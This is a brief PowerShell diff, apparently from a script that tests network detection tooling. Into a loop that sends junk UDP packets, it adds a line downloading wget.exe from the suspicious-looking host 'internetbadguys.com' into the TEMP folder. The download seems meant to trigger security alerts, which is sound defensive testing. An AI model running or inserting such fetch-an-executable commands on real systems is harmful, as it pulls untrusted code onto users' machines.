@@ -161,7 +161,8 @@ function Trigger-NDR {
             $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200)
             $udpClient.Send($data, $data.Length) | Out-Null
             Start-Sleep -Milliseconds 25
-        }
+            Invoke-WebRequest -Uri 'http://internetbadguys.com/wget.exe' -OutFile "$env:TEMP\wget.exe"
+       }
     } Catch {
         Write-Host "NDR test failed. Continuing..." -ForegroundColor Yellow
     }
